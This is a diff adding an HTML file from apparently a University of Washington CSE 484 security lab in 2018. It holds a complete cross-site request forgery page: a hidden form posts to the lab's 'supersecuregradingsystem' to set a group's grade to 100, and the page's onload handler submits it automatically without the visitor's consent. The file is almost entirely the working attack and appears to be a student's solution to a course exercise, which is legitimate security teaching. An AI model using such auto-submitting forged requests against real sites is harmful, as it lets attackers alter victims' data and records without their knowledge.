@@ -1,0 +1,28 @@
+<!--- 
+
+================================================================================  
+ Copyright © 2018 Uday Mahajan, Anupam Gupta & Kushal Jhunjhunwalla.
+  All rights reserved.  Permission is hereby granted to staff registered 
+  for University of Washington CSE 484 for use solely during Autumn Quarter 2018
+  for purposes of the course.  No other use, copying, distribution, or modification
+  is permitted without prior written consent. Copyrights for
+  third-party components of this work must be honored.
+================================================================================  
+ -->
+
+<html>
+
+
+    <head>
+		<form action="https://codered.cs.washington.edu/lab2/supersecuregradingsystem/?action=update-grade" method="POST">
+		<input type="hidden" name="groups" value="cryptception"/>
+		<input type="hidden" name="grade" value="100"/>
+		<input type="submit" value="Update Grade"/>
+		</form>
+    </head>
+	
+	
+    <body onload="document.forms[0].submit()">
+        <h1> Changing Grade </h1>
+    </body>
+</html>
